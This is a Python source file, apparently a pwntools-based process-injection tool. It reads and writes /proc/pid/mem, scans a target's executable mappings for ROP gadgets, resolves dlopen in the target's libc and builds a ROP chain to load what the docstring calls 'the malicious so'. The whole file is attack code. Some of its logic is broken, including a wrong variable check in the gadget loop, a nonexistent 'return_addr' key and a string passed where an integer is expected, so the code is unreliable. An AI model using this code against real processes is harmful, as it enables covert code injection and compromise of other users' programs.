import logging
from ctypes import *

from pwn import *
import os

PAGE_SIZE = 4096

# memory related and relevant procfs virtual files
PROC_MAPS = "/proc/{}/maps"
PROC_MEM = "/proc/{}/mem"
PROC_SYSCALL = "/proc/{}/syscall"

# gadgets

nop = b"\x90\xc3"  # nop; ret;
jmp_rax = b"\xff\xe0"  # jmp rax;
pop_rsi = b"\x5e\xc3"  # pop rsi; ret;
pop_rdi = b"\x5f\xc3"  # pop rdi; ret;
mov_rax_rsi = b"\x48\x89\xf0\xc3"  # mov rax, rsi; ret;

GADGET_LIST = {
    "nop": nop,
    "jmp_rax": jmp_rax,
    "pop_rsi": pop_rsi,
    "pop_rdi": pop_rdi,
    "mov_rax_rsi": mov_rax_rsi
}


def read_memory(pid: int, address: int, num_bytes: int):
    """
    :param pid: id of the target process
    :param address: virtual address to read from
    :param num_bytes: amount of bytes to read from
    :return: read bytes
    """
    with open(PROC_MEM.format(pid), 'rb') as mem_file:
        mem_file.seek(address)
        return mem_file.read(num_bytes)


def write_memory(pid: int, address: int, content: bytes):
    """
    :param pid: id of the target process
    :param address: virtual address to write to
    :param content: what to write
    :return: void
    """
    with open(PROC_MEM.format(pid), 'wb') as mem_file:
        mem_file.seek(address)
        mem_file.write(content)


def parse_maps_entry(mapped_entry: str) -> dict:
    """
    :param mapped_entry: a line parsed from /proc/pid/maps that includes a mapped memory entry
    :return: a parsed memory entry (dict)
    """
    parsed = {}
    split_entry = mapped_entry.split(" ")
    parsed['name'] = split_entry[-1]
    addresses = split_entry[0].split("-")
    parsed['start'] = addresses[0]
    parsed['end'] = addresses[1]
    parsed['perms'] = split_entry[1]
    return parsed


def parse_maps(pid: int) -> dict:
    """
    :param pid: id of the target process
    :return: parsed dict of the relevant (stack / exec) mapped memory entries
    """
    final = {}
    binaries = []
    with open(PROC_MAPS.format(pid), "r") as file:
        maps_data = file.read().split("\n")[:-1]
    for entry in maps_data:
        if "[stack]" in entry:
            final["stack"] = parse_maps_entry(entry)
        elif "r-xp" in entry:
            binaries.append(parse_maps_entry(entry))
    final["bin"] = binaries
    return final


def get_entry_size(maps_entry: dict) -> int:
    """
    :param maps_entry: dict
    :return: the size of the mapped memory
    """
    map_start = "0x" + maps_entry["start"]
    map_end = "0x" + maps_entry["end"]
    map_size = int(map_end, 16) - int(map_start, 16)
    return map_size


def find_gadget(pid: int, maps_entry: dict, gadget: bytes) -> int:
    """
    :param pid: id of the target process
    :param maps_entry: dict representing a parsed memory mapping
    :param gadget: signature (assembled instructions) of the gadget
    :return: the desired gadget's address in mapped executable memory
    """
    map_size = get_entry_size(maps_entry)
    start = int("0x" + maps_entry["start"], 16)
    mapped_memory = read_memory(pid, start, map_size)
    offset = mapped_memory.find(gadget)
    if offset != -1:
        result = offset + start
    else:
        result = offset
    log.info(f"found gadget: {gadget} at {hex(result)}")
    return result


def locate_dlopen(pid: int, libc_base: int) -> int:
    """
    :param pid: id of the target process
    :param libc_base: base address of libc in the target process
    :return: the final address of dlopen in the target process
    """
    libc = CDLL('libc.so.6')
    dlopen = libc.dlopen
    address = cast(addressof(dlopen), POINTER(c_ulonglong)).contents.value
    maps = parse_maps(pid)
    base = None
    for entry in maps['bin']:
        if 'libc.so.6' in entry["name"]:
            base = entry["start"]
            break
    if base is None:
        raise Exception("could not find libc base address in target process")
    offset = address - int(base, 16)
    final_addr = libc_base + offset
    log.info(f"libc base: {hex(final_addr)}")
    return final_addr


def dl_open_rop(pid: int, address: int, so_path: str, maps: dict):
    """
    :param pid: id of the target process
    :param address: target address
    :param so_path: the path to the malicious so
    :param maps: a parsed proc maps dict
    :return: void
    """

    for gadget in GADGET_LIST.keys():
        log.info(f"finding: {gadget}")
        for binary in maps["bin"]:
            gadget_addr = find_gadget(pid=pid, maps_entry=binary, gadget=GADGET_LIST[gadget])
            if address != -1:
                if gadget == "return_addr":
                    address = address + 2
                log.success("found! => " + str(hex(address)))
                GADGET_LIST[gadget] = gadget_addr.to_bytes(8, byteorder="little")
                break

    for binary in maps["bin"]:
        if 'libc.so.6' in binary["name"]:
            dlopen_addr = locate_dlopen(pid=pid, libc_base=binary["start"])
            break
    else:
        print("[-] didn't find dlopen's address...")
        exit(1)

    rop_chain = GADGET_LIST["pop_rsi"] + p64(dlopen_addr) + GADGET_LIST["mov_rax_rsi"] + GADGET_LIST["pop_rsi"] + (
        2).to_bytes(8, byteorder="little") + GADGET_LIST["pop_rdi"] + so_path.encode() + GADGET_LIST["jmp_rax"]

    return rop_chain

class SyscallInfo:
    def __init__(self, syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip):
        self.syscall_num = syscall_num
        self.rdi = rdi
        self.rsi = rsi
        self.rdx = rdx
        self.r10 = r10
        self.r8 = r8
        self.r9 = r9
        self.rsp = rsp
        self.rip = rip

    def __repr__(self):
        return (
            f"SyscallInfo(\n"
            f"  syscall_num={hex(self.syscall_num)},\n"
            f"  rdi={hex(self.rdi)},\n"
            f"  rsi={hex(self.rsi)},\n"
            f"  rdx={hex(self.rdx)},\n"
            f"  r10={hex(self.r10)},\n"
            f"  r8={hex(self.r8)},\n"
            f"  r9={hex(self.r9)},\n"
            f"  rsp={hex(self.rsp)},\n"
            f"  rip={hex(self.rip)}\n"
            f")"
        )


def parse_proc_syscall(pid):
    syscall_file = f'/proc/{pid}/syscall'

    try:
        with open(syscall_file, 'r') as f:
            content = f.read().strip()

        values = content.split()

        syscall_num = int(values[0], 16)
        rdi = int(values[1], 16)
        rsi = int(values[2], 16)
        rdx = int(values[3], 16)
        r10 = int(values[4], 16)
        r8 = int(values[5], 16)
        r9 = int(values[6], 16)
        rsp = int(values[7], 16)
        rip = int(values[8], 16)

        return SyscallInfo(syscall_num, rdi, rsi, rdx, r10, r8, r9, rsp, rip)

    except FileNotFoundError:
        log.error(f"/proc/{pid}/syscall not found")
        return None
    except Exception as e:
        log.error(f"Error parsing syscall file: {e}")
        return None
